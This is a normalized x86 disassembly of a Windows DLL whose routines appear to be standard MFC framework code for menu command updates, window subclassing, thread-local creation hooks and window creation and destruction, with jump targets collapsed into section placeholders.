je r-xdata
test edi edi
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] eax
jne r-xdata
add esi 0xc
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
push 0x10
push eax
push [ ebp + 0x10 ]
call sub_1000a610
add esp 0xc
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp + 0xc ] 0x1
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_100158c8
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x20 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x24 ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x1c ] ecx
mov [ eax + 0x18 ] ecx
retn
sub_100158ee
push esi
mov esi ecx
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ esp + 0x8 ] 0x0
push edi
jne r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
push [ esp + 0xc ]
mov ecx [ esi + 0x14 ]
call sub_100181f3
pop edi
mov edi [ esi + 0x14 ]
call [ GetFocus@IAT ]
cmp eax [ edi + 0x1c ]
jne r-xdata
pop esi
retn 0x4
mov ecx [ esp + 0x8 ]
neg ecx
sbb ecx ecx
and ecx 0xfffffffd
add ecx 0x3
or ch 0x4
push ecx
push [ esi + 0x8 ]
push [ eax + 0x4 ]
call [ EnableMenuItem@IAT ]
jmp r-xdata
push [ edi + 0x1c ]
call [ GetParent@IAT ]
push eax
call sub_10015f39
mov ecx [ esi + 0x14 ]
test ecx ecx
je r-xdata
mov [ esi + 0x18 ] 0x1
push 0x0
push ecx
push [ eax + 0x1c ]
call [ GetNextDlgTabItem@IAT ]
push eax
call sub_10015f39
mov ecx eax
call sub_1001821a
mov ecx [ ecx + 0x1c ]
sub_1001597e
push esi
mov esi ecx
push edi
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
mov edi [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x87
push [ eax + 0x1c ]
call edi
test ah 0x20
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
pop edi
pop esi
retn 0x4
mov eax [ esi + 0x14 ]
push 0x0
push [ esp + 0x10 ]
push 0xf1
push [ eax + 0x1c ]
call edi
mov ecx [ esp + 0xc ]
neg ecx
sbb ecx ecx
and ecx 0x8
or ch 0x4
push ecx
push [ esi + 0x8 ]
push [ eax + 0x4 ]
call [ CheckMenuItem@IAT ]
jmp r-xdata
sub_100159e0
push esi
push edi
mov esi ecx
xor edi edi
xor ecx ecx
cmp [ esp + 0xc ] edi
mov eax [ esi ]
setne cl
push ecx
mov ecx esi
call [ eax + 0x4 ]
cmp [ esi + 0xc ] edi
je r-xdata
pop edi
pop esi
retn 0x4
cmp [ esi + 0x10 ] edi
jne r-xdata
cmp [ rw-data ] edi
jne r-xdata
push [ rw-data ]
mov eax [ esi + 0xc ]
push edi
push 0x400
push [ esi + 0x8 ]
push [ eax + 0x4 ]
call [ SetMenuItemBitmaps@IAT ]
call sub_1001991b
cmp [ rw-data ] edi
je r-xdata
sub_10015a36
push esi
mov esi ecx
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push [ esp + 0x8 ]
mov eax [ esi + 0x14 ]
push [ eax + 0x1c ]
call sub_10018568
cmp [ esi + 0x10 ] 0x0
jne r-xdata
pop esi
retn 0x4
mov ecx [ esi + 0x8 ]
push edi
mov edi 0x400
push edi
push ecx
push [ eax + 0x4 ]
call [ GetMenuState@IAT ]
push [ esp + 0xc ]
and ax 0xf6fb
or eax edi
push [ esi + 0x4 ]
push eax
mov eax [ esi + 0xc ]
push [ esi + 0x8 ]
push [ eax + 0x4 ]
call [ ModifyMenuA@IAT ]
pop edi
jmp r-xdata
sub_10015b9b
push esi
mov esi ecx
call sub_1001560e
push 0x20
lea eax [ esi + 0x1c ]
push 0x0
push eax
mov [ esi ] r--data
call sub_10009030
add esp 0xc
mov eax esi
pop esi
retn
sub_10015bd9
push esi
push edi
mov esi ecx
call sub_1001560e
lea edi [ esi + 0x1c ]
push 0x20
push 0x0
push edi
mov [ esi ] r--data
call sub_10009030
mov eax [ esp + 0x18 ]
add esp 0xc
mov [ edi ] eax
mov eax esi
pop edi
pop esi
retn 0x4
sub_10015c28
push ebp
mov ebp esp
sub esp 0x10
test [ ebp + 0x13 ] 0x10
push esi
jne r-xdata
pop esi
leave
retn 0xc
mov esi [ ebp + 0x8 ]
mov ecx esi
call sub_10018155
test eax 0x50000000
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push [ esi + 0x1c ]
call [ GetWindowRect@IAT ]
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
cmp ecx [ ebp - 0x10 ]
jne r-xdata
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0xc ]
jne r-xdata
push 0x4
push [ esi + 0x1c ]
call [ GetWindow@IAT ]
push eax
call sub_10015f39
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xac ]
test eax eax
je r-xdata
mov ecx eax
call sub_100181d8
test eax eax
jne r-xdata
push 0x0
mov ecx esi
call sub_10017a54
sub_10015ca1
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov ecx esi
call sub_10018155
test eax 0x40000000
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
mov ecx esi
call sub_100173af
mov edi [ ebp + 0x10 ]
mov ebx eax
mov ecx edi
call sub_100173af
cmp ebx eax
je r-xdata
mov eax [ esi + 0x1c ]
test edi edi
mov [ ebp - 0x8 ] eax
jne r-xdata
mov eax [ edi + 0x1c ]
mov [ ebp - 0x4 ] eax
and [ ebp - 0x4 ] edi
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
push 0x36e
push [ ebx + 0x1c ]
call [ SendMessageA@IAT ]
sub_10015d02
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0xfffffffe
push esi
jne r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x201
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_100173af
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] 0x207
je r-xdata
push [ eax + 0x1c ]
call [ GetLastActivePopup@IAT ]
push eax
call sub_10015f39
mov esi eax
test esi esi
je r-xdata
cmp [ ebp + 0x10 ] 0x204
jne r-xdata
call [ GetForegroundWindow@IAT ]
push eax
call sub_10015f39
cmp esi eax
je r-xdata
mov ecx esi
call sub_100181d8
test eax eax
je r-xdata
push [ esi + 0x1c ]
call [ SetForegroundWindow@IAT ]
push 0x1
pop eax
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_10015d78
mov eax sub_1001a5a4
call sub_10008d90
sub esp 0x34
push ebx
push esi
push edi
mov ecx rw-data
mov [ ebp - 0x10 ] esp
push sub_10018ffb
call sub_10019387
mov ebx eax
push 0x7
pop ecx
lea edi [ ebp - 0x40 ]
lea eax [ ebx + 0x34 ]
and [ ebp - 0x4 ] 0x0
mov esi eax
mov [ ebp - 0x14 ] ebx
[ edi ] [ esi ]
mov ecx [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov [ eax ] ecx
mov eax [ ebp + 0x14 ]
cmp esi 0x2
mov [ ebx + 0x3c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebx + 0x38 ] esi
mov [ ebx + 0x40 ] eax
jne r-xdata
and [ ebp + 0x8 ] 0x0
cmp esi 0x110
jne r-xdata
mov ecx [ edi + 0x34 ]
test ecx ecx
je r-xdata
push [ ebp + 0x18 ]
mov eax [ edi ]
mov ecx edi
push [ ebp + 0x14 ]
push esi
call [ eax + 0x98 ]
cmp esi 0x110
mov [ ebp + 0x18 ] eax
jne r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push edi
call sub_10015c05
mov eax [ ecx ]
push 0x0
call [ eax + 0x5c ]
push 0x7
mov eax [ ebp + 0x18 ]
lea edi [ ebx + 0x34 ]
pop ecx
lea esi [ ebp - 0x40 ]
[ edi ] [ esi ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x14
push [ ebp + 0x8 ]
lea eax [ ebp - 0x24 ]
push eax
push edi
call sub_10015c28
jmp r-xdata
sub_10015e22
call sub_100155f9
mov ecx [ ebp - 0x14 ]
mov edx [ eax ]
add ecx 0x34
push ecx
mov ecx eax
push [ ebp + 0xc ]
call [ edx + 0x6c ]
mov ecx [ ebp + 0xc ]
mov [ ebp + 0x18 ] eax
call sub_100150f7
mov eax r-xdata
retn
sub_10015e6b
push esi
push sub_10018ffb
mov ecx rw-data
call sub_10019387
mov esi eax
call [ GetMessageTime@IAT ]
mov [ esi + 0x44 ] eax
call [ GetMessagePos@IAT ]
movsx ecx ax
shr eax 0x10
movsx eax ax
mov [ esi + 0x48 ] ecx
mov [ esi + 0x4c ] eax
lea eax [ esi + 0x34 ]
pop esi
retn
sub_10015ea0
push esi
mov esi ecx
push sub_10018ffb
mov ecx rw-data
call sub_10019387
push [ eax + 0x40 ]
mov edx [ esi ]
mov ecx esi
push [ eax + 0x3c ]
push [ eax + 0x38 ]
call [ edx + 0xa0 ]
pop esi
retn
sub_10015ec7
mov eax sub_1001a5ba
call sub_10008d90
push esi
call sub_1001979a
mov esi eax
cmp [ esi + 0x14 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
push sub_1001860f
call sub_100142f6
push 0x48
mov ebx eax
call sub_10014308
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x1
push 0x1c
push r--data
call sub_10017fb5
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x14 ] eax
call sub_100142f6
pop ebx
sub_10015f39
push esi
push edi
push 0x1
call sub_10015ec7
mov esi eax
push [ esp + 0xc ]
mov ecx esi
call sub_1001801a
mov edi eax
push esi
mov ecx edi
call sub_1001823b
mov eax edi
pop edi
pop esi
retn 0x4
sub_10015f7e
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
jne r-xdata
push edi
push 0x1
call sub_10015ec7
mov edi eax
push ebx
mov [ esi + 0x1c ] ebx
lea ecx [ edi + 0x4 ]
call sub_100141ea
push edi
mov ecx esi
mov [ eax ] esi
call sub_1001823b
push 0x1
pop eax
pop edi
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn 0x4
sub_10015fb7
push esi
mov esi ecx
push edi
mov edi [ esi + 0x1c ]
test edi edi
je r-xdata
and [ esi + 0x38 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_10015ec7
test eax eax
je r-xdata
and [ esi + 0x1c ] 0x0
push [ esi + 0x1c ]
lea ecx [ eax + 0x4 ]
call sub_1001423a
sub_10015fe5
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x360
jne r-xdata
push [ ebp + 0x8 ]
call sub_10015f60
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_10015d78
push 0x1
pop eax
jmp r-xdata
pop ebp
retn 0x10
sub_1001601a
mov eax sub_1001a5c4
call sub_10008d90
sub esp 0x40
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi r--data
mov [ ebp - 0x10 ] esp
push esi
push edi
call [ GetPropA@IAT ]
and [ ebp - 0x14 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
push 0x1
sub eax 0x6
pop ebx
je r-xdata
push [ ebp + 0x14 ]
call sub_10015f39
push edi
mov esi eax
call sub_10015f39
push esi
push [ ebp + 0x10 ]
push eax
call sub_10015ca1
sub eax 0x1a
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push [ ebp - 0x18 ]
call [ CallWindowProcA@IAT ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
push edi
call sub_10015f39
mov ecx [ ebp + 0x14 ]
shr ecx 0x10
push ecx
movsx ecx [ ebp + 0x14 ]
push ecx
push eax
call sub_10015d02
xor ebx ebx
test eax eax
sete bl
jmp r-xdata
sub eax 0x62
je r-xdata
test ebx ebx
je r-xdata
push [ ebp - 0x18 ]
push 0xfffffffc
push edi
call [ SetWindowLongA@IAT ]
push esi
push edi
call [ RemovePropA@IAT ]
push esi
call [ GlobalFindAtomA@IAT ]
push eax
call [ GlobalDeleteAtom@IAT ]
jmp r-xdata
sub eax 0x8e
jne r-xdata
push edi
call sub_10015f39
mov esi eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push esi
call sub_10015c05
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x110
push edi
push [ ebp - 0x18 ]
call [ CallWindowProcA@IAT ]
push [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x30 ]
push eax
push esi
call sub_10015c28
sub_1001613d
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x40 ] eax
call sub_100155f9
mov edx [ eax ]
lea ecx [ ebp - 0x4c ]
push ecx
mov ecx eax
push [ ebp - 0x20 ]
call [ edx + 0x6c ]
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
call sub_100150f7
mov eax r-xdata
retn
sub_10016179
push ebp
mov ebp esp
push esi
push edi
push sub_10019ade
mov ecx rw-data
call sub_1001941c
mov edi [ ebp + 0xc ]
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_1001601a
cmp edi 0x135
je r-xdata
push [ esi + 0x8 ]
push eax
lea eax [ edi - 0x132 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_100179df
test eax eax
je r-xdata
cmp edi 0x136
je r-xdata
mov eax [ esi + 0x4 ]
jmp r-xdata
cmp edi 0x138
je r-xdata
pop edi
pop esi
pop ebp
retn 0x10
cmp edi 0x137
je r-xdata
cmp edi 0x134
jne r-xdata
sub_100161f5
push ebp
mov ebp esp
sub esp 0x10
push sub_10018ffb
mov ecx rw-data
call sub_10019387
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ eax + 0x14 ]
push edi
mov edi [ ecx ]
call sub_10019774
movzx eax [ eax + 0x14 ]
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
test esi esi
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ eax + 0x2c ]
call [ CallNextHookEx@IAT ]
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
test [ edi + 0x23 ] 0x40
jne r-xdata
leave
retn 0xc
test esi esi
je r-xdata
push 0xffffffe6
push ebx
call [ GetClassLongA@IAT ]
test eax 0x10000
jne r-xdata
mov esi [ ebp - 0x4 ]
test eax eax
jne r-xdata
push 0xfffffffc
push ebx
call [ GetWindowLongA@IAT ]
test eax eax
mov [ ebp + 0x8 ] eax
je r-xdata
push ebx
mov ecx esi
call sub_10015f7e
mov eax [ esi ]
mov ecx esi
call [ eax + 0x50 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x80 ]
cmp [ rw-data ] 0x0
mov [ ebp + 0xc ] eax
jne r-xdata
mov eax [ edi + 0x28 ]
mov ecx eax
shr ecx 0x10
test cx cx
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
push [ esi + 0x2c ]
call [ UnhookWindowsHookEx@IAT ]
and [ esi + 0x2c ] 0x0
mov edi [ GetPropA@IAT ]
mov esi r--data
push esi
push ebx
call edi
test eax eax
jne r-xdata
call sub_10016014
mov esi eax
push esi
push 0xfffffffc
push ebx
call [ SetWindowLongA@IAT ]
cmp eax esi
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push r--data
push eax
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
and [ ebp - 0x10 ] cl
lea eax [ ebp - 0x10 ]
push 0x5
push eax
mov ax [ edi + 0x28 ]
push eax
call [ GlobalGetAtomNameA@IAT ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x8 ]
push esi
push ebx
call [ SetPropA@IAT ]
push esi
push ebx
call edi
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
and [ esi + 0x14 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov edi [ rw-data ]
test edi edi
je r-xdata
push esi
call [ GlobalAddAtomA@IAT ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28 ] 0x0
mov eax sub_10016179
jne r-xdata
push [ ebp + 0x10 ]
push ebx
push 0x3
push [ esi + 0x2c ]
call [ CallNextHookEx@IAT ]
cmp [ ebp - 0x8 ] 0x0
mov edi eax
je r-xdata
cmp [ edi + 0x20 ] 0x0
je r-xdata
push eax
push 0xfffffffc
push ebx
call [ SetWindowLongA@IAT ]
mov eax sub_1001601a
push 0x0
push 0x0
push 0x36f
push ebx
push esi
call sub_10015d78
test eax eax
mov [ ebp - 0x10 ] eax
je r-xdata
call sub_10016014
push 0xfffffffc
push ebx
mov [ ebp + 0x8 ] eax
call [ GetWindowLongA@IAT ]
push [ ebp - 0x10 ]
mov esi eax
sub esi [ ebp + 0x8 ]
push ebx
neg esi
sbb esi esi
inc esi
call [ edi + 0x20 ]
test esi esi
jne r-xdata
push [ ebp + 0x8 ]
push 0xfffffffc
push ebx
call [ SetWindowLongA@IAT ]
jmp r-xdata
sub_100163eb
push esi
push edi
push sub_10018ffb
mov ecx rw-data
call sub_10019387
mov esi eax
mov edi [ esp + 0xc ]
cmp [ esi + 0x14 ] edi
je r-xdata
pop edi
pop esi
retn 0x4
cmp [ esi + 0x2c ] 0x0
jne r-xdata
mov [ esi + 0x14 ] edi
call [ GetCurrentThreadId@IAT ]
push eax
push 0x0
push sub_100161f5
push 0x5
call [ SetWindowsHookExA@IAT ]
test eax eax
mov [ esi + 0x2c ] eax
jne r-xdata
call sub_10013f97
sub_10016437
push esi
push sub_10018ffb
mov ecx rw-data
call sub_10019387
mov esi eax
call sub_10019774
cmp [ eax + 0x14 ] 0x0
je r-xdata
cmp [ esi + 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push 0x1
pop eax
pop esi
retn
and [ esi + 0x14 ] 0x0
xor eax eax
pop esi
retn
push eax
call [ UnhookWindowsHookEx@IAT ]
and [ esi + 0x2c ] 0x0
sub_10016479
push ebp
mov ebp esp
sub esp 0x30
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x2c ]
mov esi ecx
mov [ ebp - 0x28 ] eax
call sub_10019774
mov eax [ eax + 0x8 ]
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x30 ]
mov [ ebp - 0x30 ] eax
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x5c ]
test eax eax
jne r-xdata
push edi
push esi
call sub_100163eb
push [ ebp - 0x30 ]
push [ ebp - 0x2c ]
push [ ebp - 0x28 ]
push [ ebp - 0x24 ]
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call [ CreateWindowExA@IAT ]
mov edi eax
call sub_10016437
test eax eax
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xa4 ]
xor eax eax
jmp r-xdata
xor eax eax
test edi edi
setne al
pop edi
mov eax [ esi ]
mov ecx esi
call [ eax + 0xa4 ]
pop esi
leave
retn 0x2c
sub_1001655f
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push esi
test eax eax
push edi
jne r-xdata
mov edi [ eax + 0x1c ]
xor edi edi
jmp r-xdata
push [ ebp + 0x20 ]
mov eax [ ebp + 0x14 ]
push [ ebp + 0x1c ]
mov edx [ eax + 0x4 ]
mov esi [ eax ]
push edi
mov edi [ eax + 0xc ]
mov eax [ eax + 0x8 ]
sub edi edx
sub eax esi
push edi
push eax
mov eax [ ebp + 0x10 ]
push edx
or eax 0x40000000
push esi
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push 0x0
call sub_10016479
pop edi
pop esi
pop ebp
retn 0x1c
sub_100165ab
mov eax sub_1001a5d8
call sub_10008d90
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x1c ] 0x0
je r-xdata
mov ecx [ esi + 0x34 ]
test ecx ecx
je r-xdata
cmp esi rw-data
je r-xdata
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
cmp esi rw-data
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_10015628
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
cmp [ eax + 0x24 ] esi
jne r-xdata
cmp esi rw-data
je r-xdata
and [ eax + 0x24 ] 0x0
cmp esi rw-data
je r-xdata
call sub_10016769
sub_10016627
push esi
mov esi ecx
mov ecx [ esi + 0x34 ]
test ecx ecx
je r-xdata
and [ esi + 0x34 ] 0x0
mov ecx esi
call sub_10015ea0
pop esi
retn
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_10016645
push ebp
mov ebp esp
sub esp 0x2c
push ebx
push esi
push edi
mov esi ecx
call sub_100155f9
mov edi eax
xor ebx ebx
cmp edi ebx
je r-xdata
mov ecx [ esi + 0x30 ]
cmp ecx ebx
je r-xdata
cmp [ edi + 0x1c ] esi
jne r-xdata
mov ecx [ esi + 0x34 ]
push 0x1
test ecx ecx
pop ebx
je r-xdata
mov eax [ ecx ]
call [ eax + 0x50 ]
mov [ esi + 0x30 ] ebx
cmp [ edi + 0x20 ] esi
jne r-xdata
call sub_10019774
cmp [ eax + 0x14 ] bl
jne r-xdata
and [ esi + 0x34 ] 0x0
test [ esi + 0x24 ] bl
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
mov [ edi + 0x20 ] ebx
mov [ edi + 0x1c ] ebx
call sub_10019774
cmp edi [ eax + 0x4 ]
jne r-xdata
mov edi [ GetWindowLongA@IAT ]
push 0xfffffffc
push [ esi + 0x1c ]
call edi
mov ecx esi
mov ebx eax
call sub_10015ea0
push 0xfffffffc
push [ esi + 0x1c ]
call edi
cmp eax ebx
jne r-xdata
call sub_10019542
mov edi [ eax + 0xcc ]
test edi edi
je r-xdata
push ebx
call sub_1001a011
call sub_10018f6f
test eax eax
je r-xdata
mov ecx esi
call sub_10015fb7
mov eax [ esi ]
mov ecx esi
call [ eax + 0xa4 ]
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi ]
mov ecx esi
call [ eax + 0x80 ]
mov eax [ eax ]
test eax eax
je r-xdata
cmp [ edi + 0x1c ] 0x0
je r-xdata
push eax
push 0xfffffffc
push [ esi + 0x1c ]
call [ SetWindowLongA@IAT ]
push 0x2c
lea eax [ ebp - 0x2c ]
push 0x0
push eax
call sub_10009030
mov eax [ esi + 0x1c ]
add esp 0xc
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x2c ] 0x28
push eax
push 0x0
push 0x405
mov [ ebp - 0x28 ] ebx
push [ edi + 0x1c ]
call [ SendMessageA@IAT ]
sub_10016769
push esi
mov esi ecx
cmp [ esi + 0x1c ] 0x0
jne r-xdata
push ebx
push edi
push 0x0
call sub_10015ec7
push [ esi + 0x1c ]
lea ecx [ eax + 0x4 ]
call sub_100141b7
mov ecx [ esi + 0x38 ]
mov edi eax
test ecx ecx
jne r-xdata
xor eax eax
pop esi
retn
mov eax [ ecx ]
call [ eax + 0x50 ]
push [ esi + 0x1c ]
call [ DestroyWindow@IAT ]
jmp r-xdata
mov eax ebx
pop edi
pop ebx
pop esi
retn
mov ecx esi
call sub_10015fb7
test edi edi
mov ebx eax
jne r-xdata
sub_100167b6
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x28 ]
test eax eax
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ esi + 0x1c ]
push eax
call [ CallWindowProcA@IAT ]
mov eax [ esi ]
call [ eax + 0x80 ]
mov eax [ eax ]
test eax eax
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ esi + 0x1c ]
call [ DefWindowProcA@IAT ]
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_10016820
push esi
call sub_10019542
mov esi eax
mov eax [ esi + 0xcc ]
test eax eax
je r-xdata
cmp [ esp + 0x8 ] 0x0
mov esi [ esi + 0x108 ]
je r-xdata
mov eax [ eax + 0x1c ]
test eax eax
je r-xdata
pop esi
retn 0x4
test esi esi
je r-xdata
push 0x0
push 0x0
push 0x401
push eax
call [ SendMessageA@IAT ]
push 0x1
call [ GetKeyState@IAT ]
test ax ax
jl r-xdata
mov eax [ esi ]
push 0xffffffff
mov ecx esi
call [ eax + 0xdc ]
sub_10016877
push ebp
mov ebp esp
push ebx
push edi
push [ ebp + 0xc ]
mov ebx ecx
push [ ebp + 0x8 ]
push [ ebx + 0x1c ]
call sub_100184f3
mov edi eax
test edi edi
je r-xdata
or eax 0xffffffff
push esi
push edi
call [ GetDlgCtrlID@IAT ]
mov esi [ ebp + 0x10 ]
movzx eax ax
test esi esi
mov [ ebp + 0xc ] eax
je r-xdata
mov eax [ ebp + 0xc ]
pop esi
jmp r-xdata
cmp [ esi ] 0x28
jb r-xdata
pop edi
pop ebx
pop ebp
retn 0xc
mov eax [ ebx + 0x1c ]
or [ esi + 0x4 ] 0x1
or [ esi + 0x24 ] 0xffffffff
push 0x0
push 0x0
push 0x87
push edi
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edi
call [ SendMessageA@IAT ]
test ah 0x20
jne r-xdata
or [ esi + 0x4 ] 0x80000002
sub_100168e8
push esi
mov esi [ esp + 0xc ]
push edi
mov edi ecx
cmp [ esi ] 0x1
jne r-xdata
push 0x0
push [ esi + 0x14 ]
call sub_10017525
test eax eax
jne r-xdata
push [ esi + 0x14 ]
call sub_10018448
test eax eax
je r-xdata
pop edi
pop esi
retn 0x8
mov ecx edi
call sub_10015ea0
mov edx [ eax ]
push esi
mov ecx eax
call [ edx + 0xc ]
jmp r-xdata
sub_10016925
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push esi
push eax
mov eax [ ebp + 0xc ]
mov esi ecx
push [ eax + 0x8 ]
call sub_10017525
test eax eax
je r-xdata
mov ecx esi
call sub_10015ea0
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0x8
sub_1001696f
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_10015ea0
lea eax [ ebp + 0xc ]
push eax
call sub_100174f8
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_1001699a
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
push [ esi + 0x4 ]
call [ GetMenuItemCount@IAT ]
mov ebx eax
xor edi edi
test ebx ebx
jle r-xdata
xor eax eax
push edi
push [ esi + 0x4 ]
call [ GetSubMenu@IAT ]
push eax
call sub_10018433
test eax eax
je r-xdata
push edi
push [ esi + 0x4 ]
call [ GetMenuItemID@IAT ]
cmp eax [ esp + 0x14 ]
je r-xdata
push [ esp + 0x14 ]
push eax
call sub_1001699a
test eax eax
jne r-xdata
push [ esi + 0x4 ]
call sub_10018448
jmp r-xdata
inc edi
cmp edi ebx
jl r-xdata
pop edi
pop esi
pop ebx
